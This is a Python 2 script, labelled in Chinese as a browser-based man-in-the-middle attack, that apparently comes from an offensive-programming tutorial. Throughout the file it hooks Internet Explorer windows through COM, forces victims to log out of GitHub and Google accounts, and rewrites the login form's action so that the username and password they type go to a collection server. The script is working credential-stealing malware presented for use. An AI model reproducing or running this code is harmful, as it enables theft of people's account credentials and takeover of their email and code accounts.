#!/usr/bin/env python
# -*- coding: utf-8 -*-

# 基于浏览器的中间人攻击

import win32com.client
import time
import urlparse
import urllib

data_receiver = "http://localhost:8080/"

target_sites  = {}

target_sites["github.com"] = {
    "logout_url": None,
    "logout_form": "/logout",
    "login_url": "https://github.com/login",
    "login_form_index": 0,
    "owned": False
}

target_sites["accounts.google.com"] = {
    "logout_url": "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
    "logout_form": None,
    "login_url": None,
    "login_form_index": 0,
    "owned": False
}

target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

clsid='{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

windows = win32com.client.Dispatch(clsid)

def wait_for_browser(browser):
    # Wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return

while True:
    for browser in windows:
        url = urlparse.urlparse(browser.LocationUrl)
        print url.hostname

        if url.hostname in target_sites:
            if target_sites[url.hostname]["owned"]:
                continue

            # If there is an URL we can just redirect
            if target_sites[url.hostname]["logout_url"]:
                browser.Navigate(target_sites[url.hostname]["logout_url"])
                wait_for_browser(browser)
                time.sleep(5)
            else:
                # Retrieve all elements in the document
                full_doc = browser.Document.all

                # Iterate looking for the logout form
                for i in full_doc:
                    try:                        
                        # Find the logout form and submit it
                        if i.action == target_sites[url.hostname]["logout_form"]:
                            i.submit()
                            wait_for_browser(browser)
                    except:
                        pass
            try:
                # 跳转到指定的登陆地址
                if target_sites[url.hostname]["login_url"]:
                    browser.Navigate(target_sites[url.hostname]["login_url"])
                    wait_for_browser(browser)
                    
                # Now we modify the login form
                login_index = target_sites[url.hostname]["login_form_index"]
                login_page = urllib.quote(browser.LocationUrl)
                browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                print browser.Document.forms[login_index].action
                target_sites[url.hostname]["owned"] = True 
            except Exception, e:
                print e
                pass

        time.sleep(5)